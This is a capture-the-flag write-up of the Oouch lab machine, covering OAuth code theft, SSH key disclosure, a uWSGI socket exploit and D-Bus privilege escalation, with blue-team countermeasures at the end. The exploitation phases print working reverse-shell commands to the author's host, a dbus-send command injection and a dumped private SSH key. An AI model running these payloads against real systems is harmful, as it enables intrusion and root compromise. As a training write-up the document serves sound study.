### Phase 1: Reconnaissance (Information Gathering)

The first step in any engagement is a thorough reconnaissance of the target system to understand its attack surface.

A full TCP port scan was initiated to identify all open services on the target IP address, providing a comprehensive map of potential entry points.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.29.195 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.29.195
```

![nmap_result](images/Oouch1.png)

We can see that in ftp project.txt is avaible:

```bash
ftp 10.129.29.195
```

Login as Anonymous and get the file. Here's the content:

```
Flask -> Consumer
Django -> Authorization Server
```

I googled it and it seems to be connected to OAuth. It uses either credentials or delegated service to login. If we browse to: "http://10.129.29.195:5000/", we will be redericted to login page. We can choose register form:

![web_result](images/Oouch2.png)

After login wee see the following:

![web_result](images/Oouch3.png)

As we supposed there're 'Connected-Accounts:' field. Also there's another intersting tab:

![web_result](images/Oouch4.png)

### Phase 2: Weaponization (Payload Development)

We can try and test xss:

```bash
sudo python3 -m http.server
```

```
<img src="http://10.10.14.68:8000/a"/>
```

We got this warning message:

![web_result](images/Oouch5.png)

Tried to brute directories:

```bash
ffuf -u http://10.129.29.195:5000/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt:FUZZ
```

Nothing useful was found so let's check OAuth endpoint:

```
http://10.129.29.195:5000/oauth
```

![web_result](images/Oouch6.png)

Let's add hosts:

```bash
echo "10.129.29.195 oouch.htb consumer.oouch.htb" | sudo tee -a /etc/hosts
```

We again asked to login, but we can register again this time we will use username 'test'. We need to add another host:

```bash
echo "10.129.29.195 authorization.oouch.htb" | sudo tee -a /etc/hosts
```

I got an eternal error so I'll reset the machine and ip will be changed so hosts file need to be changed too.

Found this endpoint for oauth:

```
http://authorization.oouch.htb:8000/signup/
```

Now create another user 'oauth'. In signup form there're ssh fields. We know that ssh exist from nmap scan. Maybe we will be able to control someone's account and get those ssh creds.

![web_result](images/Oouch7.png)

Two new endpoints:
```
    /oauth/authorize
    /oauth/token
```

![web_result](images/Oouch8.png)

### Phase 3: Delivery (Transmission to Target)

Now that we connected oauth, let's check those 2 endpoins. I used test account to intercept all request that we have made so far. When you'll connect your account to oauth service copy the url and drop the request with token code:

```
http://consumer.oouch.htb:5000/oauth/connect/token?code=17IEpZlxr9927iQJ4rcek8Tg05kihh
```

Send it to admin with contact page. Then go here: "http://consumer.oouch.htb:5000/oauth/login"

![web_result](images/Oouch9.png)

### Phase 4: Exploitation (Exploiting Vulnerability)

Now we have full admin access.

```
    dev_access.txt              develop:supermegasecureklarabubu123! -> Allows application registration.
    o_auth_notes.txt            /api/get_user -> user data. oauth/authorize -> Now also supports GET method.
    todo.txt                    Chris mentioned all users could obtain my ssh key. Must be a joke...
```

Now we know creds, api, and possibility to find somewhere ssh key.

Go at 'http://authorization.oouch.htb:8000/oauth/applications/register' and use creds that we've found.

![web_result](images/Oouch10.png)

Setup nc:

```bash
nc -lnvp 7777
```

Name it by your choice. Make it public to potentially get more codes, and change 'Authorization grant type' to auth code. Last thing to capture them is to change 'Redirect uris' to 'http://10.10.14.68:7777/'. We will do the same trick with qtc as beforebut now we'll change our request to provider site instead of consumer. Now we're logged in as qtc if we set qtc's cookie and go at 'http://authorization.oouch.htb:8000/'.

![web_result](images/Oouch11.png)

Now grab qtc token with get_ssh api.

```
/api/get_ssh/
```

```
{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"}
```

### Phase 5: Installation (Payload Installation / Persistence)

Now ssh as qtc:

```bash
nano id_rsa
chmod 600 id_rsa 
ssh -i id_rsa qtc@oouch.htb
```

![ssh_result](images/Oouch12.png)

```bash
ls -lah
```

You can see '.note.txt' file

```
Implementing an IPS using DBus and iptables == Genius?
```

Let's look for DBus:

```bash
ps aux | grep dbus
```
```
root      1416  0.0  0.0   4676  1044 ?        Ss   14:28   0:00 /root/dbus-server
message+  1433  0.0  0.1   9128  4232 ?        Ss   14:28   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
qtc       3616  0.0  0.0   6076   824 pts/0    S+   15:34   0:00 grep dbus
```

Indeed, dbus is running. Let's check .conf file:

```bash
cat /etc/dbus-1/system.d/htb.oouch.Block.conf
```

```
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

www-data is the user that we needed. Use this command to find docker and container ip:

```bash
ps -ef f
```
```
root      2052     1  0 14:28 ?        Ssl    0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      2633  2052  0 14:28 ?        Sl     0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.4 -container-port 5000
root      2662  2052  0 14:28 ?        Sl     0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.5 -container-port 8000
```

```bash
ssh -i id_rsa qtc@172.18.0.4
```

There's an unsual code directory in /.

![ssh_result](images/Oouch13.png)

### Phase 6: Command and Control (C2)

If we google for exploit we will need to go at 'https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py' and grab a script. Delete 2 lines 18 & 19. We already strated python server so let's download it to our victim machine:

```bash
wget http://10.10.14.68:8000/exploit.py
wget http://10.10.14.68:8000/nc.exe
```

Next we need to upload it to docker container:

```bash
scp exploit.py qtc@172.18.0.4:/tmp/exploit.py
scp nc.exe qtc@172.18.0.4:/tmp/nc.exe
```

Now again on Oouch machine:

```bash
nc -lnvp 7777
```

In the container:

```
python exploit.py -m unix -u uwsgi.socket -c "bash -c 'bash -i >& /dev/tcp/10.10.14.68/7777 0>&1'"
```

Exploit worled and we got a shell as www-data.

![ssh_result](images/Oouch14.png)

I found routes.py:

```
import dbus
    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
            bus.close()
```

### Phase 7: Actions on Objectives (Privilege Escalation / Impact / Exfiltration)

Now exploit:

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2>&1 | nc 10.10.14.68 4444 >/tmp/.0;"
```

![ssh_result](images/Oouch15.png)

We got a root flag.


### What I Learnt from OOuch Machine

#### **1. OAuth Authorization Code / Redirect Abuse**

* **Technique**: Registered a malicious OAuth application on `authorization.oouch.htb`, set `Redirect URIs` to `http://10.10.14.68:7777/`, made the app public and captured authorization `code` delivered to the attacker’s listener; abused `/oauth/authorize` supporting GET.
* **Lesson**: Insecure app registration + missing redirect-URI validation (and lax endpoint methods) allows authorization-code theft and account takeover.

#### **2. Sensitive Info Leakage via Public FTP / Files**

* **Technique**: Anonymous FTP download of `project.txt` revealing architecture (`Flask -> Consumer`, `Django -> Authorization Server`).
* **Lesson**: Public files with architecture/config details speed up targeted attacks — leak = reconnaissance shortcut.

#### **3. API Exposes Secrets (SSH Key Disclosure)**

* **Technique**: Used captured token/privileged access to call `/api/get_ssh/` and retrieve `qtc`’s private SSH key.
* **Lesson**: APIs that return secrets without strict auth/RBAC allow full credential compromise and lateral access.

#### **4. Container/Proxy Enumeration → Lateral Movement**

* **Technique**: Enumerated `dockerd` / `docker-proxy` processes to find container IPs (`172.18.0.4/5`), SCP/SSH into container with retrieved key.
* **Lesson**: Exposed docker-proxy bindings and reachable container IPs enable moving from host → container; container networking must be isolated.

#### **5. uWSGI Unix-Socket RCE → www-data Shell**

* **Technique**: Deployed `uwsgi` exploit against `uwsgi.socket` to execute reverse shell (`bash -i >& /dev/tcp/ATT/7777`) and obtain `www-data`.
* **Lesson**: Unprotected sockets and vulnerable service deployments (uWSGI) are trivial RCE vectors if file/socket perms are weak.

#### **6. D-Bus IPC Misconfiguration → Privilege Escalation to root**

* **Technique**: Found `/etc/dbus-1/system.d/htb.oouch.Block.conf` allowing `www-data` to call `htb.oouch.Block`; sent crafted `dbus-send` payload to execute commands as root (mkfifo / shell → root).
* **Lesson**: Over-permissive D-Bus policies or insecure IPC interfaces let low-privilege users trigger privileged actions — critical attack point.

---

### Reflection

* **Chained weaknesses**: public info → OAuth/app-registration → API secret leak → container access → service exploit → IPC misconfig = full compromise.
* **Human + config attack surface**: contact page + lax app registration were as critical as exploitable sockets.
* **Attack economy**: one small misconfig (redirect validation / API auth / dbus policy) enabled complete takeover.

---

### Redemption (Blue Team Recommendations)

| Attack Phase                 | Defensive Countermeasures                                                                                                                                               |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Recon / Public Files**     | - Remove sensitive files from public FTP/web. <br> - DLP/scan repos & webroots for config/credentials. <br> - Harden FTP (disable anonymous).                           |
| **OAuth / App Registration** | - Enforce strict Redirect URI validation and PKCE for public clients. <br> - Require admin approval for app registration. <br> - Limit `/oauth/authorize` to POST+CSRF. |
| **API Secret Exposure**      | - Never return private keys via API. <br> - Enforce RBAC, short-lived secrets, secret vaults and key rotation. <br> - Audit/alert on `/api/get_ssh`-like endpoints.     |
| **Container Exposure**       | - Don’t bind docker-proxy to 0.0.0.0; use internal networks. <br> - Firewall host→container traffic. <br> - Don’t run SSH inside containers exposed to host network.    |
| **uWSGI / Socket Hardening** | - Restrict socket file permissions and run services non-root. <br> - Keep frameworks/containers patched; scan for known uWSGI issues.                                   |
| **D-Bus / IPC Policies**     | - Tighten D-Bus policy files: restrict which users can `Send`/`Own`. <br> - Validate inputs on IPC methods and run privileged services under dedicated accounts.        |
| **C2 / Shell Detection**     | - Egress filtering, IDS signatures for reverse shells, monitor nc/tcp egress, alert on unusual listeners and long-lived outbound connections.                           |

---

### Key Takeaways for Blue Teams

1. **Validate OAuth flows & lock app registration** — redirect URI checks + PKCE + admin gating.
2. **Treat APIs as secret-sensitive** — never expose private keys; require vault + RBAC + logging.
3. **Isolate container networking** — don’t expose container ports/proxies to attacker-controllable interfaces.
4. **Harden IPC & service sockets** — D-Bus and unix-sockets are high-value escalation targets; audit and restrict them.